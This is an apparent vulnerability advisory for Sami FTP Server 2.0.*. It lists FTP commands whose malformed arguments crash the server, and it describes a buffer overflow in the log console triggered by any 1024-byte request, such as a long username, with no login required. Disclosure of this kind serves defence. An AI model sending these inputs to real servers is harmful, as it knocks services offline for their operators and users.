# Sami FTP Server 2.0.* Multiple Remote Vulnerabilities
#
# Bugs :
#
# 1)Multiples remote denial of service
(CWD,DELE,MKD,RMD,RETR,RNFR,RNTO,SIZE,STOR)
#
# 2)Remote Buffer overflow (Logs)
#
# Remote Denial of service:
# APPE A => server gone
#
# CWD AA => server gone
#
# DELE AA ==> server gone
#
# MKD AA ==> server gone
#
# RMD AA ==> server gone
#
# RETR AA ==> server gone
#
# RNFR AA ==> server gone
#
# RNTO AA ==> server gone
#
# SIZE AA ==> server gone
#
# STOR AA ==> server gone
#
#
# Buffer Overflow :
# In the console management,you can view your logs,and set some stuff,when
you open the console management a
#
# buffer overflow occurs ,if you have send previously a request(no matter
the command) with 1024 bytes to the server.
#
# Also explorer.exe crash at the same time, 2 in 1 ;] The file is called(
SamyFtp.binlog)note that this bug is
#
# quite critical , because it will occurs all the time,when you open the
console management,and you dont need to be loggued
#
# you can simply send a username with 1024 bytes ...
#
#
# @nolife: Life is always better when you dont know. things are clearer also
